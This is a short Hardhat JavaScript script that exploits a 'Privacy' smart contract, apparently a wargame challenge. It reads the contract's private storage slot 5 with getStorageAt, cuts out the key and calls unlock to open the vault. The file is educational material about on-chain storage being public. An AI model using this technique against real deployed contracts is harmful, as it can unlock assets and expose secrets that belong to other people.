// privacy.js - Exploits the Privacy contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { privacyAddress, privacyAbi } = require("../contracts");

async function main() {
    // Get ethers signer and contract instances
    const provider = ethers.provider;
    const account = await ethers.getSigner();
    const privacy = new ethers.Contract(privacyAddress, privacyAbi, provider);
    const privacySigner = privacy.connect(account);

    // Check the lock status at the beginning
    let locked = await privacySigner.locked();
    console.log("Vault is locked:", locked);
    
    // console.log("Running exploit...");

    // // Read the storage data at slot 5 to get the password
    // console.log("Getting storage layout...");
    // let value;
    // for (let i = 0; i < 8; i++) {
    //     value = await provider.getStorageAt(privacyAddress, i);
    //     console.log(`Slot ${i}: ${value}`);
    // }
    
    console.log("Getting key from storage...");
    let key = await provider.getStorageAt(privacyAddress, 5);
    key = key.slice(0, 34);
    console.log("Key is:", key);

    // Send a transaction to the unlock method with the password
    console.log("Unlocking privacy...")
    let unlockTxn = await privacySigner.unlock(key);
    await unlockTxn.wait();

    // Confirm exploit 
    locked = await privacySigner.locked();
    console.log("Vault is locked:", locked);

    console.log("Exploit completed.")

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });